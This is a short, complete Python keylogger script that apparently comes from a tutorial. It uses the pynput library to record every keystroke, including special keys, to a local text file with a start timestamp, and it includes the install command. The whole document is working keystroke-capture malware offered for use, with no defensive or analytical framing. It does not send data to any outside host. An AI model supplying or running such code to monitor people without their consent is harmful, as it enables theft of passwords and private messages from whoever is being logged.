# Step 1: Install pynput before running this code
# Run in terminal: pip install pynput

from pynput import keyboard
import datetime

# File where keys will be saved
log_file = "key_log.txt"

# Write a welcome or timestamp entry at the start
with open(log_file, "a") as f:
    f.write(f"\n\n--- Logging started at {datetime.datetime.now()} ---\n")

# Function that gets called on each key press
def on_press(key):
    try:
        # Try to get the actual character (like a, b, 1, etc.)
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (like space, enter, shift)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key.name}]")

# Start the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
 

